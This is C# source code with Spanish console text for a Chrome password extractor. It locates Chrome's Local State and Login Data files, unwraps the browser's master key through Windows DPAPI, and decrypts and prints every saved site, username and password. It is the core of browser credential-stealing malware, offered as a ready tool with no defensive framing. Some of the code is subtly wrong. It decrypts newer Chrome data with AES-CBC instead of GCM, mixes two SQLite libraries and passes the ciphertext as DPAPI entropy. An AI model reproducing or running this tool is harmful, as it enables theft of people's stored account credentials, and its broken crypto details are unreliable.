using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using Microsoft.Data.Sqlite;
using System.Linq;

class ChromePasswordExtractor
{
    [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pCipherText,
        ref string pszDescription,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPrompt,
        int dwFlags,
        ref DATA_BLOB pPlainText);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    static void Main()
    {
        Console.OutputEncoding = Encoding.GetEncoding("ISO-8859-1");
        Console.WriteLine("=== Extractor de Contraseñas de Chrome ===");

        string chromePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Google\\Chrome\\User Data");

        string loginDataPath = Path.Combine(chromePath, "Default\\Login Data");
        string localStatePath = Path.Combine(chromePath, "Local State");

        if (!File.Exists(loginDataPath) || !File.Exists(localStatePath))
        {
            Console.WriteLine("No se encontraron los archivos necesarios de Chrome.");
            Console.ReadKey();
            return;
        }

        try
        {
            string masterKey = GetMasterKey(localStatePath);
            if (string.IsNullOrEmpty(masterKey))
            {
                Console.WriteLine("No se pudo obtener la master key.");
                return;
            }

            ExtractAndDecryptPasswords(loginDataPath, masterKey);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }

        Console.WriteLine("\nPresiona cualquier tecla para salir...");
        Console.ReadKey();
    }

    static string GetMasterKey(string localStatePath)
    {
        try
        {
            string localState = File.ReadAllText(localStatePath);
            dynamic json = JsonConvert.DeserializeObject(localState);
            string encryptedKey = json.os_crypt.encrypted_key;

            byte[] key = Convert.FromBase64String(encryptedKey).Skip(5).ToArray();
            byte[] decryptedKey = CryptUnprotectData(key);
            return decryptedKey != null ? BitConverter.ToString(decryptedKey).Replace("-", "") : null;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error obteniendo master key: {ex.Message}");
            return null;
        }
    }

    static void ExtractAndDecryptPasswords(string loginDataPath, string masterKey)
    {
        string tempFile = Path.GetTempFileName();

        try
        {
            File.Copy(loginDataPath, tempFile, true);

            using (var conn = new SqliteConnection($"Data Source={tempFile};Version=3;"))
            {
                conn.Open();
                string query = "SELECT origin_url, username_value, password_value FROM logins";

                using (var cmd = new SqliteCommand(query, conn))
                using (var reader = cmd.ExecuteReader())
                {
                    Console.WriteLine("\nContraseñas encontradas:\n");
                    Console.WriteLine("URL".PadRight(50) + "Usuario".PadRight(30) + "Contraseña");
                    Console.WriteLine(new string('-', 100));

                    while (reader.Read())
                    {
                        string url = reader["origin_url"].ToString();
                        string username = reader["username_value"].ToString();
                        byte[] encryptedPassword = (byte[])reader["password_value"];

                        string password = DecryptPassword(encryptedPassword, masterKey);

                        Console.WriteLine($"{url.Trim().PadRight(50)} {username.Trim().PadRight(30)} {password}");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error extrayendo contraseñas: {ex.Message}");
        }
        finally
        {
            if (File.Exists(tempFile))
                File.Delete(tempFile);
        }
    }

    static string DecryptPassword(byte[] encryptedData, string masterKey)
    {
        try
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return "[vacía]";

            // Versión nueva (Chrome v80+)
            if (encryptedData.Length > 3 && encryptedData[0] == 'v' && encryptedData[1] == '1' && encryptedData[2] == '0')
            {
                byte[] iv = encryptedData.Skip(3).Take(12).ToArray();
                byte[] payload = encryptedData.Skip(15).ToArray();
                byte[] keyBytes = StringToByteArray(masterKey);

                // Implementación alternativa con Aes (CBC mode)
                using (var aes = Aes.Create())
                {
                    aes.Key = keyBytes;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (var decryptor = aes.CreateDecryptor())
                    using (var ms = new MemoryStream(payload))
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    using (var sr = new StreamReader(cs, Encoding.UTF8))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
            // Versión antigua
            else
            {
                byte[] decrypted = CryptUnprotectData(encryptedData);
                return decrypted != null ? Encoding.UTF8.GetString(decrypted) : "[no se pudo descifrar]";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error al descifrar: {ex.Message}");
            return "[error al descifrar]";
        }
    }

    static byte[] CryptUnprotectData(byte[] encryptedData)
    {
        DATA_BLOB encryptedBlob = new DATA_BLOB();
        DATA_BLOB decryptedBlob = new DATA_BLOB();
        string description = string.Empty;

        try
        {
            encryptedBlob.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            encryptedBlob.cbData = encryptedData.Length;
            Marshal.Copy(encryptedData, 0, encryptedBlob.pbData, encryptedData.Length);

            if (CryptUnprotectData(ref encryptedBlob, ref description, ref encryptedBlob, IntPtr.Zero, IntPtr.Zero, 0, ref decryptedBlob))
            {
                byte[] decryptedBytes = new byte[decryptedBlob.cbData];
                Marshal.Copy(decryptedBlob.pbData, decryptedBytes, 0, decryptedBlob.cbData);
                return decryptedBytes;
            }
            return null;
        }
        finally
        {
            if (encryptedBlob.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(encryptedBlob.pbData);
            if (decryptedBlob.pbData != IntPtr.Zero)
                Marshal.FreeHGlobal(decryptedBlob.pbData);
        }
    }

    static byte[] StringToByteArray(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }
}